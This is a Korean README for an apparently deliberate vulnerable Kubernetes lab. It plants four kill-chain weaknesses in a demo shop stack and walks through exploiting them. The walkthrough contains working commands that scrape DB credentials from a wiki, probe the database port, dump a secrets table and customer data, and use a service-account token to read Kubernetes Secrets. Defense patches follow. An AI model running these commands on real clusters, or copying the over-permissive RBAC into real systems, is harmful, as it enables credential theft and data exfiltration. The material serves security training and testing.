# k8s/killchain — 메인 킬체인 (환경 구축 3단계)

깨끗한 ShopFlow 스택에 취약점을 **"흔한 운영 실수"처럼** 심어, 공격자가 정찰로 약한 고리를
찾아내야 뚫리게 만든다. **이게 심긴 스택이 실험의 취약 베이스라인**(리셋 대상)이다.

## 킬체인 (①→④)

| 단계 | 취약점 | 심은 위치 | MITRE |
|------|--------|-----------|-------|
| **① 초기침투** | DB 커넥션 스트링 평문 노출 | `internal-wiki` 런북 (`services/internal/42-internal-wiki.yaml`) | T1552.001 |
| **② 권한상승** | `admin-dashboard` SA에 전 NS Secret 조회 + 정찰 권한 | `killchain/10-admin-overperm-rbac.yaml` + admin 파드 연결 | T1078 |
| **③ 측면이동** | NetworkPolicy 부재 → 어느 파드든 `database` 직접 도달 | (부재가 곧 취약점, k3s는 NP 강제 가능) | T1210 |
| **④ 목표탈취** | 고객데이터 + FLAG | `postgres` `internal_secrets` 테이블 | T1213 |

**사슬 구조**: ①(크레덴셜) + ③(네트워크)가 ④에서 합쳐진다. ②는 ①과 **독립적인 크레덴셜 획득
경로**(Secret 직접 읽기) + 정찰 수단을 제공 → 다중 경로라 방어자가 한 곳만 막아선 못 끊는다.

## 구성
```
killchain/
├─ 10-admin-overperm-rbac.yaml      # ② 과권한 SA (베이스라인에 적용)
└─ defense-reference/                # 방어자가 적용할 패치 예시 (베이스라인 미적용)
    ├─ networkpolicy-database.yaml   #   ③ 차단: database 인그레스 제한
    └─ rbac-reduced.yaml             #   ② 완화: 최소 권한 Role로 교체
```
①(wiki 유출)과 ② 연결(admin 파드의 `serviceAccountName`)은 `services/internal/` 매니페스트에
직접 반영되어 있다(주석 `3단계` 표시).

## 수동 공격 walkthrough (사람이 끝까지 뚫어보기)

> 자동 루프 붙이기 전에 사람이 직접 성공해봐야 한다. 실제 루프에선 VM C가 발판을 주지만,
> 여기선 공격자 파드를 띄워 "웹 계층 침해"를 모사한다. (netshoot pull에 인터넷 필요)

**발판 — frontend 계층에 공격자 셸:**
```bash
kubectl -n frontend run attacker --rm -it --image=nicolaka/netshoot --restart=Never -- bash
```

**① 크레덴셜 유출 — 사내 위키 런북에서 DB 접속정보 획득:**
```bash
curl -s http://internal-wiki.internal.svc.cluster.local/runbook.html | grep postgresql
# → postgresql://appuser:devpassword123@postgres.database.svc.cluster.local:5432/customerdb
```

**③ 측면이동 — NP 부재로 발판(frontend)에서 database 직접 도달 확인:**
```bash
nc -zv postgres.database.svc.cluster.local 5432     # → open (차단 없음)
```

**④ 목표탈취 — DB 접속해 FLAG 획득** (attacker 셸 나와서, psql 있는 파드로):
```bash
kubectl -n frontend run dbattack --rm -it --image=postgres:16-alpine --restart=Never -- \
  psql "postgresql://appuser:devpassword123@postgres.database.svc.cluster.local:5432/customerdb" \
  -c "SELECT key, value FROM internal_secrets;"
# → FLAG{...}  +  고객 PII도 SELECT * FROM customers 로 탈취 가능
```

**② 권한상승 (독립 경로) — admin-dashboard 침해 시 과권한 SA로 Secret 직접 탈취:**
```bash
# 과권한 확인:
kubectl auth can-i list secrets --all-namespaces --as=system:serviceaccount:internal:admin-sa   # → yes
# 침해된 admin 파드에서 토큰으로 DB 크레덴셜 Secret 직접 조회 (①없이도 획득):
kubectl -n internal exec deploy/admin-dashboard -- sh -c \
  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   https://kubernetes.default.svc/api/v1/namespaces/database/secrets/postgres-credentials' | grep -o "POSTGRES_PASSWORD[^\"]*"
```

## 방어 검증 (방어자 패치가 실제로 막는지)
```bash
# ③ 차단:
kubectl apply -f k8s/killchain/defense-reference/networkpolicy-database.yaml
#   → frontend 발판에서 nc/psql 재시도 시 타임아웃(차단). 쇼핑몰(web→backend→db)은 정상.
# ② 완화:
kubectl delete clusterrolebinding admin-tools-binding && kubectl delete clusterrole admin-tools
kubectl apply -f k8s/killchain/defense-reference/rbac-reduced.yaml
#   → auth can-i list secrets --all-namespaces ... → no
# ① 차단: 위키 런북에서 크레덴셜 제거 + DB 비밀번호 로테이션
```

## 리셋
완전 원복은 VMware 스냅샷 복원(5단계 자동화). 수동으론 `teardown-services.sh` 후 재배포 +
방어 레퍼런스로 적용한 NP/RBAC 수동 삭제.
